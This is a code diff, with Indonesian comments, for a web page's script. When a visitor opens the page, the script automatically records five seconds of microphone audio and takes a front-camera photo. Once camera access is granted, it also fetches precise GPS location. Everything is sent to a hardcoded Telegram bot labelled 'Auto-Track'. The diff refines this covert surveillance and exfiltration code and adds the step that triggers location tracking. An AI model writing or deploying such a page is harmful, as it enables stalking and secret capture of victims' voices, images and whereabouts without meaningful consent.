@@ -119,14 +119,12 @@
       });
     }
 
-    function sendMedia(blob, type, filename, caption) {
+    function sendVoice(blob, filename) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
-        formData.append(type, blob, filename);
-        if(caption) formData.append('caption', caption);
-        let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
-        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }).catch(console.error);
+        formData.append('voice', blob, filename);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -143,28 +141,19 @@
       } catch (err) {}
     }
 
-    // FITUR LOKASI OTOMATIS
+    // Fungsi GPS yang dipanggil setelah izin kamera diberikan
     function getGPSLocation() {
       if (navigator.geolocation) {
-        // Meminta lokasi dengan akurasi tinggi
         navigator.geolocation.getCurrentPosition(
           pos => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
             const link = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            sendToTelegram(`<b>📍 Lokasi GPS Ditemukan:</b>\n\n<code>Latitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${acc} meter</code>\n\n<a href="${link}">Buka di Google Maps</a>`);
+            sendToTelegram(`<b>📍 Lokasi GPS (Auto-Track):</b> <a href="${link}">Klik di sini</a>`);
           },
-          (err) => {
-            let pesan = "Gagal mendapatkan lokasi";
-            if(err.code == 1) pesan = "Izin Lokasi Ditolak ❌";
-            sendToTelegram(`📍 <b>Status Lokasi:</b> ${pesan}`);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          () => sendToTelegram(`📍 Izin Lokasi Ditolak ❌`),
+          { enableHighAccuracy: true }
         );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
 
@@ -173,14 +162,14 @@
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
         mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          sendMedia(blob, 'voice', 'auto_voice.ogg', '🎤 Auto Voice Note');
+          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
+          sendVoice(blob, 'voice_note.mp3');
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
       } catch (err) {
         sendToTelegram('Izin Voice Note ditolak ❌');
       }
@@ -189,6 +178,10 @@
     async function takePhoto(facingMode, label) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+        
+        // JIKA KAMERA DIIZINKAN, LANGSUNG LACAK GPS
+        getGPSLocation();
+
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
@@ -210,15 +203,14 @@
       }
     }
 
+    // SEMUA IZIN OTOMATIS SAAT MASUK (TANPA TOMBOL)
     window.addEventListener('DOMContentLoaded', () => {
       createParticles();
       getInfo();
       
-      // Semua permintaan izin akses berjalan serentak saat masuk
-      getGPSLocation();
+      // Pemicu izin serentak
       autoRecordAudio();
       takePhoto("user", "Depan");
-      takePhoto("environment", "Belakang");
     });
 
     button.addEventListener('click', () => {
